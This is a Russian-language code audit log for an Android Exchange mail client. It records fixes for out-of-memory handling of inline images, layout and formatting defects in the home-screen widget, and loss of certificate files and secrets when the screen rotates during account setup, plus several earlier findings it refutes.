**Найдено:** путь открытия (`EmailDetailViewModel`/`EmailDetailActions`) образцово защищён от `Exception`, но **`OutOfMemoryError` — это `Error`, а не `Exception`** → `catch(Exception)` его не ловит. Загрузка inline-картинок обрабатывает MIME до 20 МБ и строит `data:`-URL в памяти → на «тяжёлых» письмах OOM → некошенный краш процесса. **✅ Смягчено:** в `observeInlineImages` добавлен `catch(Throwable)` — при OOM/Error письмо показывается без inline-картинок вместо краша. **Нужен logcat stack trace** для точного подтверждения: краш на «удалении» отдельного письма этой гипотезой не объясняется (возможен второй путь — синхронный рендер конкретного контента).

**✅ PREVENTION-фикс (2026-07-01):** по бест-практик (OOM **предотвращают**, а не ловят — интернет-верифицировано, [InnovationM](https://www.innovationm.com/blog/android-out-of-memory-error-causes-solution-and-best-practices/)) в `MimeHtmlProcessor.extractInlineImagesFromMime` добавлен лимит `MAX_INLINE_MIME_CHARS = 8 МиБ`: MIME больше — не обрабатываем (письмо показывается без inline-картинок). Единая точка (N-5) → защищает и UI-, и протокольный путь. Attachment-путь `loadInlineImages` уже был с лимитами (2 МБ/картинка, 5 МБ суммарно). `catch(Throwable)` в `observeInlineImages` оставлен как backstop (prevention + net). Тест `MimeHtmlProcessorInlineImageTest`. (Точная локализация краша всё ещё требует logcat.)

---

## Аудит наэкранного виджета (2026-07-01)

Детальный разбор `widget/MailWidget.kt` (Glance) + `WidgetConfigActivity.kt` + `res/xml/mail_widget_info.xml` + манифест-регистрация. Ранее числился «не читан, низкий риск» (см. «Покрытие»). Виджет в целом написан **очень защитно** (per-DB-call try/catch, `SizeMode.Responsive`, distinct data-URI). Исправлено **4 дефекта** (W-1…W-4); **W-5** — осознанный tradeoff, задокументирован без правки. Раздел прошёл **2 прохода**: первый — находки W-1…W-4; второй (ре-верификация покодово по семантике `LinearLayout` + интернет) **ужесточил W-1** (гибкая усекаемая метка синка — защита кнопок при 12-часовой локали/длинной метке), добавил **W-5** (углы на API<31) и **отклонил один кандидат** (исчезающее превью — оказался no-op, см. «Проверено и БЕЗОПАСНО»).

**W-1 (Low-Medium, layout — обрезка кнопок). Нижний ряд переполняет ширину на узком виджете.**
Glance `Row` → горизонтальный `LinearLayout` **без переноса**: переполнение по ширине молча обрезается (интернет-верифицировано: [Android «Build UI with Glance»](https://developer.android.com/develop/ui/compose/glance/build-ui) / [«Provide flexible widget layouts»](https://developer.android.com/develop/ui/views/appwidgets/layouts) — рекомендация «на узких размерах отдавать меньше детей / усечённый текст через `SizeMode.Responsive`+`LocalSize`»). Нижний ряд = аватары (фикс. 48dp, `take(4)`) + текст синка + `defaultWeight` + 2 кнопки. На наименьшем Responsive-размере 180×140 (внутр. ширина ~148dp) уже 2 аватара (96) + текст (~45) + 2 кнопки (~51) = 192 > 148 → **кнопка синка уходит за край и недоступна**. Аватары к тому же не масштабировались `scale`, в отличие от всего остального UI.
**✅ ИСПРАВЛЕНО:** `isWide = size.width >= 300.dp`; аватары `take(if (isWide) 4 else 2)`; аватар масштабируется (`AccountAvatar(…, scale)` — box `40*scale`, круг `34*scale`, буква `15*scale`); текст времени синка показывается только на широком (иначе вытесняет кнопки). Расчёт: узкий 180 → 2×32 + 2 кнопки 51 = 123 < 148 ✓; широкий 320 (внутр. 288) → 4×37 + текст 45 + 2 кнопки 60 = 269 < 288 ✓. Соответствует официальной рекомендации «fewer children / truncated text on small».
**✅ УЖЕСТОЧЕНО (ре-верификация, 2-й проход):** запас на широком был тонким (~7–19dp) и **12-часовая локаль** («at 2:30 PM» шире «14:30») + 4 аккаунта могли всё же вытолкнуть кнопку. Метка синка сделана **гибким (`defaultWeight`) элементом с `maxLines=1`** — она забирает свободное место между аватарами и кнопками и **усекается**, а НЕ выталкивает кнопки, при любой локали/длине. Ветка «нет метки» — просто `defaultWeight`-распорка (кнопки всегда прижаты к правому краю). Интернет-верифицировано: `defaultWeight()` применяется к любым детям Row, не только Spacer'ам ([Build UI with Glance](https://developer.android.com/develop/ui/compose/glance/build-ui)).

**W-2 (Low, логика/UX). `formatSyncAgo` неоднозначен для не-сегодняшних синков.**
Синк «вчера в 14:30» рендерился как «в 14:30»/«at 14:30» — выглядит как сегодняшний (сравнения дня не было). **✅ ИСПРАВЛЕНО:** извлечена чистая `internal fun isSameLocalDay(a,b)` (только `Calendar`, default-TZ); не сегодня → **только дата `dd.MM`** (короче «в HH:MM» — не расширяет метку; время суток у суточно-старого синка = шум, KISS). Тест `MailWidgetFormatTest` (граница суток, разные годы с одним днём года).

**W-3 (Low, перф + UX). `SimpleDateFormat` в цикле + всегда полная дата для писем.**
`SimpleDateFormat("dd.MM.yyyy")` создавался **внутри** `forEachIndexed` (до 3× на рендер) и показывал полную дату даже для сегодняшней почты. **✅ ИСПРАВЛЕНО:** форматтеры (`DateFormat.getTimeFormat` + `SimpleDateFormat("dd.MM")`) вынесены из цикла; сегодняшнее письмо → время (полезнее для свежей почты), старое → `dd.MM` (через `isSameLocalDay`, DRY с W-2). `SimpleDateFormat` — локальный `val` на рендер (не shared) → потокобезопасно.

**W-4 (Low, KISS/DRY). Мёртвые поля `EventInfo.endTime`/`location` + `emailSenderSize`.**
`endStr`+`location` вычислялись в `loadWidgetData` каждый рендер, но UI показывает только `.time`/`.title`; `val emailSenderSize` объявлялась и не использовалась (буква отправителя берёт inline `(10*scale).sp`). **✅ ИСПРАВЛЕНО:** `data class EventInfo(title, time)` + удалена мёртвая `emailSenderSize`.

**W-5 (Info, косметика на API 26–30 — осознанный tradeoff, НЕ исправляется). Скругления углов не применяются ниже Android 12.**
Интернет-верифицировано: Glance `GlanceModifier.cornerRadius(Dp)` работает **только на API 31+** ([composables/cornerRadius](https://composables.com/docs/androidx.glance/glance-appwidget/functions/cornerRadius), [Android 12 widgets](https://developer.android.com/about/versions/12/features/widgets)); на API 26–30 — no-op → аватары/кнопки/pill/карточка рендерятся квадратными (8 call-site `cornerRadius(Dp)` в виджете, `values-31`/SDK-branch нет). Официальный фолбэк — drawable-фон с `<corners>` через `.background(ImageProvider(shape))`, НО код **намеренно** избегает `ImageProvider`-фона (коммент: краш лаунчера HyperOS 2.0 на FrameLayout+ImageView). Т.е. «правильный» фолбэк **реинтродуцировал бы краш**. Вывод: квадратные углы на Android 8–11 — осознанная цена за отсутствие краша (crash-avoidance > косметика; «краши недопустимы»). Альтернатива без риска — `values-31` resource-qualifier для радиуса + XML shape в `values/` — визуально-верификационная задача, оставлена разработчику. Не крэш/гонка/утечка.

**Проверено и БЕЗОПАСНО (не находки — для протокола):**
- **PendingIntent-коллизии нет:** каждый clickable несёт distinct `data`-URI (`iwomail://widget/search|calendar|tasks|notes|compose`, `iwomail://email/{id}`, `iwomail://account/{id}`). `filterEquals` учитывает `data` → интенты различимы (иначе Glance слил бы клики).
- **Краш лаунчера обойдён осознанно:** `SizeMode.Responsive` (не `Exact` — краш HyperOS 2.0 на size-map), фон через `ColorProvider` (не `ImageProvider` — краш HyperOS), `WidgetConfigActivity` всегда `RESULT_OK` (RESULT_CANCELED ломает MIUI). Комментарии в коде это фиксируют.
- **Крах-устойчивость данных:** `MailDatabase.getInstance` и КАЖДЫЙ DAO-вызов в `loadWidgetData` в собственном try/catch (rethrow `CancellationException`, иначе дефолт); внешний `provideGlance` try/catch → пустой `WidgetData`. `updateMailWidget` сериализован `widgetUpdateMutex` + try/catch.
- **Нет перф-бага при batch:** `updateMailWidget` в `EmailOperationsService` вызывается ОДИН раз на batch-операцию (`markAsReadBatch:144`, не по-элементно); зовётся из sync/EmailOps/Boot/Personalization → свежесть данных после изменений обеспечена.
- **Sync-кнопка доставляет бродкаст:** `actionSendBroadcast(Intent(ACTION_SYNC_NOW).setClass(…, SyncAlarmReceiver))` — явный интент из процесса приложения (PendingIntent от app-UID) → доставка в `exported=false` собственный ресивер работает (тот же путь, что `MainActivity:238`). `updatePeriodMillis=1800000` = системный минимум (30 мин).
- **`minWidth/minHeight=180×140`** в `mail_widget_info.xml` совпадает с наименьшим Responsive-бакетом.
- **Строка последнего письма `Row { Text(sender) Spacer Text(preview, maxLines=1) }` — безопасна БЕЗ весов (разобрано во 2-м проходе):** превью — последний ребёнок, `LinearLayout` меряет невзвешенных детей по порядку с `AT_MOST(остаток)` → превью и так усекается до остатка, не выталкивая и не переполняя. Оно «исчезло» бы только если отправитель ≥ вся ширина, но тогда `defaultWeight` на превью не помогает (отправитель меряется первым). Поэтому кандидат-фикс «weighted preview» — no-op, НЕ внесён. (Отличие от W-1: там метка синка стоит ПЕРЕД кнопками → длинная невзвешенная метка стартовала бы их размер `AT_MOST(0)` → weighted-метка там реально защищает кнопки.)

**Замечание (не фикс — пользовательский выбор):** `minResizeWidth/Height=110×100` в `mail_widget_info.xml` позволяют ужать виджет НИЖЕ наименьшего Responsive-размера (180×140) → на экстремальном сжатии контент всё равно частично обрежется (Glance рендерит layout наименьшего бакета в меньшем пространстве). Штатные размеры (2×2 ≈ 140–180dp) фиксом W-1 покрыты. При желании — поднять `minResizeWidth` до ~150dp; не менял без визуальной проверки (сборку/просмотр делает разработчик).

---

## Аудит экранов настройки/онбординга/верификации (2026-07-01)

Свип 7 экранов критического пути настройки аккаунта (~8800 строк): `SetupScreen`, `VerificationScreen`, `AccountSettingsScreen`, `SettingsScreen`, `PersonalizationScreen`, `OnboardingScreen`, `UpdatesScreen`. Методология UI-1/UI-2 (крах-безопасные scope, гонки двойного submit, утечки, валидация, переживание поворота). Найдено **2 бага (SET-1, SET-2)** — исправлены; остальное — устойчиво. (SET-2 найден во 2-м проходе ре-верификации как «схожая проблема» к SET-1.)

**SET-1 (Medium, потеря данных при повороте). `SetupScreen` удалял выбранные cert-файлы при повороте экрана.**
`SetupScreen.kt` `DisposableEffect(Unit){ onDispose { if(!accountSaved) createdCertFiles.forEach{delete} } }` чистит сиротские cert-файлы при уходе без сохранения. Но MainActivity **без** `android:configChanges` (проверено по манифесту) → поворот пересоздаёт Activity → `onDispose` срабатывает И при повороте. При этом `certificatePath`/`certificateFileName`/`createdCertFiles`/`accountSaved` — все `rememberSaveable` (переживают поворот). Итог: **выбрал серверный/клиентский сертификат → повернул экран → cert-файл удалён с диска, а UI и `certificatePath` (restored) указывают на удалённый файл → верификация/сохранение падает с ошибкой загрузки серта.** Критично для self-signed Exchange 2007 (частый корп-кейс).
**✅ ИСПРАВЛЕНО:** `onDispose` пропускает удаление при повороте — `context.findActivity()?.isChangingConfigurations == true`. Интернет-верифицировано: это **ровно рекомендованный** паттерн («in the cleanup/onDispose block call `context.findActivity().isChangingConfigurations` and only perform teardown when the activity is NOT changing configurations — preventing unnecessary cleanup on rotation»), и `LocalContext.current` **может быть `ContextThemeWrapper`**, поэтому нужен `findActivity()`, а не каст ([Get Activity from Compose](https://jisungbin.hashnode.dev/adx-compose-get-activity)). Дублировавшийся приватный `ContextWrapper.findActivity()` (2 идентичные копии в About/Search — нарушение DRY) вынесен в общий `ui/utils/ContextExtensions.kt` (`fun Context.findActivity()`, `tailrec`) и переиспользован. Тест `ContextExtensionsTest` (MockK: цепочка wrapper'ов → Activity, null-случаи).

**SET-2 (Low-Medium, потеря секрета при повороте — «схожая проблема» к SET-1). `AppNavigation` очищал `VerificationSecrets` при повороте из-за фрагильного каста Activity.**
`AppNavigation.kt:853` (`onDispose` на маршруте верификации) уже пытался защититься от очистки секретов при повороте (комментарий автора: «onDispose успевает очистить секреты → ложный session expired»), но использовал **прямой каст** `(activityContext as? android.app.Activity)?.isChangingConfigurations`. Интернет-верифицировано: `LocalContext.current` часто — `ContextThemeWrapper`, а не сама `Activity` → `as? Activity` даёт `null` → `isConfigChange=false` → на повороте `VerificationSecrets.clear()` **срабатывает** → пароль/пароль клиентского серта теряются → ложное «Verification session expired. Please re-enter password.» при повороте во время верификации. Guard был, но нерабочий при обёрнутом контексте.
**✅ ИСПРАВЛЕНО:** каст заменён на `activityContext.findActivity()?.isChangingConfigurations` (тот же общий helper) — раскручивает `ContextThemeWrapper` до `Activity`, guard работает при любом контексте. Это единственный прямой `as? Activity` во всём проекте (grep) — теперь везде `findActivity()`.

**Проверено и БЕЗОПАСНО (не находки — для протокола):**
- **Крах-безопасность:** все 7 экранов используют `rememberSafeScope()` (UI-1: `SupervisorJob`+`CoroutineExceptionHandler`) — нет сырых `rememberCoroutineScope`/`GlobalScope`/`runBlocking`. `scope.launch(Dispatchers.IO)` наследует handler из контекста scope → тоже крах-безопасно.
- **Двойной submit защищён:** `SetupScreen` (`if(isLoading) return@Button` + `enabled=!isLoading&&canSave`), `SettingsScreen` (`if(isSaving) return` + `enabled`), `AccountSettingsScreen`/`VerificationScreen` (`enabled=!isLoading`/`!isCheckingAccess`), `UpdatesScreen` (`if(downloadJob!=null) return@clickable`).
- **N-8/OOM/receiver-leak:** в этих экранах нет `collectAsState` (все lifecycle-aware), нет `readBytes` (OOM не тут), нет `registerReceiver` (нет receiver-leak).
- **`VerificationScreen` savedData — НЕ баг (разобрано):** `createSavedData` и `createSavedDataForEmailMismatch` намеренно имеют РАЗНЫЙ порядок полей 11-13, т.к. парсятся РАЗНЫМИ путями `SetupScreen`: обычный (`11=clientCertPath,12=domain,13=username`, стр. 362-394) и CLEAR_EMAIL (`11=domain,12=username,13=clientCertPath`, стр. 308-341). Каждый сериализатор согласован со своим парсером. (Фрагильность `|`-формата без URL-encode в этом пути — латентная; поля на практике не содержат `|`; вне scope.)
- **Секреты не в Bundle:** `password`/`clientCertificatePassword` — `remember` (НЕ `rememberSaveable`) → не попадают в saved instance state (best-practice). Не-секретная форма — `rememberSaveable` (переживает поворот, + восстановление фокуса).
- **`AccountSettingsScreen` cert-файлы:** чистятся по ЯВНЫМ cancel/dismiss (317/417/502/559/581), НЕ в `onDispose` → нет SET-1-подобного бага при повороте.
- **`VerificationScreen`:** авто-старт через `LaunchedEffect(Unit)` → при повороте перезапуск (немигрированный экран; возможен повторный тестовый email — минорно, не краш/потеря данных); `VerificationSecrets` чистится с `isChangingConfigurations`-guard (AppNavigation 851-859).
- **`ComposeScreen` onDispose (единственный другой screen-level):** отменяет suggestion-job + чистит state — файлы не удаляет (не SET-1-класс).

---

## Опровергнутые находки прошлой сессии (ложные тревоги)

### F-1. «CRITICAL: NTLM `performNtlmHandshake()` возвращает stub `""`» — НЕВЕРНО
В `@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/eas/EwsClient.kt` параметр `authHeader` в `executeNtlmRequest` — **рудиментарный (игнорируется)**, реальный handshake Type1→Type2→Type3 выполняется внутри `executeNtlmHandshake` через `NtlmAuthenticator`. Возврат `""` — намеренный non-null маркер «NTLM доступен». Реализация NTLMv2 корректна (флаги MS-NLMP, FILETIME, MD4-fallback с верными константами). Прошлая сессия оборвалась именно на этой строке и сделала ложный вывод.

### F-2. «XML-инъекция через `deviceId` в EasProvisioning» — НЕВОЗМОЖНА
`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/eas/EasClient.kt:407` `generateStableDeviceId` всегда возвращает `"androidc" + 10 цифр`. `takeLast(15)/takeLast(8)` дают чисто буквенно-цифровую строку — `<`, `>`, `&`, кавычки невозможны.

### F-3. «Утечка памяти в `clearAllEasClientCache`» — переоценка
Метод мёртвый (см. L-1), «утечка» недостижима. Даже при вызове — это несколько `Long` по `accountId`, не leak. **(2026-07-01: метод удалён в рамках L-1 — вопрос закрыт.)**

---

## Проверено и признано устойчивым

- **Протокол Provision/449** (`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/eas/EasTransport.kt:235`): `provisionMutex` + inline `withLock` (разблокировка на любом `return`), `sendDeviceSettings()` вне лока, гард `insideSendDeviceSettings` и `command != "Provision"` исключают рекурсию/дедлок. Соответствует MS-ASPROV (двухфазный Provision).
- **NTLMv2** (`NtlmAuthenticator`): корректная ручная реализация, stateless → потокобезопасна.
- **Цикл синхронизации** (`@/V:/1.6.3b on prodaction Finally/ExchangeMailClient/app/src/main/java/com/dedovmosol/iwomail/data/repository/EmailSyncService.kt:530`): concurrency-гард `activeSyncs` (CompletableDeferred) без гонок; Status 3/12 → `SyncKey=0`+retry (соответствует MS-ASCMD, верифицировано); SyncKey сохраняется ПОСЛЕ обработки батча (идемпотентно при краше); таймауты 280с/55с < внешних 300с/60с; гарды `sameKeyCount`/`emptyDataCount`/`maxIterations` от зацикливания; reconcile вместо clear+repopulate для full resync (учёт нестабильности ServerId на EAS 12.1).
- **`EmailListViewModel` / `EmailDetailViewModel`**: полный паттерн crash-resistance во всех launch.

---

## Области с более лёгким обзором (рекомендуется углубить отдельно)

- Repository-слой целиком (Mail/Calendar/Note/Task/Settings) на DRY/SOLID и размер God-object'ов.
- Миграции `MailDatabase` и `@Transaction`-границы DAO на целостность данных.
- `HttpClientProvider`: TLS/mTLS/Certificate Pinning, хранение паролей (KeyStore/EncryptedSharedPreferences).
- Receivers/Workers/уведомления/виджет: флаги `PendingIntent` (IMMUTABLE), Binder/`TransactionTooLarge`, alarm-логика.
- `ComposeScreen` (~2.5k строк): отправка идёт через `sendController` (свой scope, переживает поворот) — известный кандидат на миграцию в MVVM; `readBytes` для вложений — потенциальный OOM на больших файлах.
